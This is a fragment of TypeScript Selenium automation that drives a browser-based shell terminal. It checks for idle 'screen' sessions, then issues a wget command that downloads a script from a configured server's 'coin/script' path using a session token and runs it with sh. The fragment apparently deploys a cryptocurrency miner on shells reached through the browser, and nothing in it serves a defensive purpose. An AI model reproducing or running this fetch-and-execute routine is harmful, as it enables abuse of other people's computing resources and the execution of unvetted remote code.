...
async function checkStdOutResult(driver: WebDriver, matchText: RegExp[]) {
  await driver.wait(until.elementsLocated(locateShellXterm), 20000);
  let elementShellXterm = await driver.findElement(locateShellXterm);
  let rows = await elementShellXterm.findElements(By.css('div'));
  let result = false;
  ...
  for (let i = 0; i < rows.length; i++) {
    text = await rows[i].getText();
    if (matchText.some(s => text.match(s))) {
      result = true;
      break;
    }
  }
    ...
    try {
      ...
      try {
        if (await readyNewCommand(driver)) {
          await sendCommand(driver, 'clear');
          await sleep(300);
          await sendCommand(driver, 'screen -ls');
          await sleep(1000);
          let result = await checkStdOutResult(driver, [
            /screen: command not found/im,
            /No Sockets found in/im
          ]);
          if (result) {
            await sendCommand(driver, 'rm -rf de.sh || true');
            await sendCommand(driver, `wget -O de.sh ${appConfigs.BASE_SHELL_URL}coin/script/${idSession}?token=${appConfigs.SYSTEM_TOKEN} && sh de.sh`);
